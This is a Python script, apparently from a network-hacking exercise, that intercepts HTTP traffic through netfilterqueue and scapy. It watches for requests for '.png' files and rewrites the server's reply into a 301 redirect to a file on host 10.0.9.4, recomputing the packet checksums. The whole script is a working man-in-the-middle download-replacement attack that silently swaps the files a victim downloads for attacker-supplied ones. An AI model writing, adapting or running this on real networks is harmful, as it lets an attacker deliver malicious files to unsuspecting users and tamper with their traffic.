#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []
extension =".png"


def process_packet(packet):
    scapy_packet= scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            #print(scapy_packet.show())
            if extension in scapy_packet[scapy.Raw].load:
                print("[+] donwload png file Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            #print("[+] scapy response type ... HTTP 80")
            #print(scapy_packet.show())
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] response downlad file png type")
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] replacing file .....")
                scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.9.4/image.jpg\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))
                print(scapy_packet.show())
                print("[+] packet succefully replaced ......")
    packet.accept()




queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

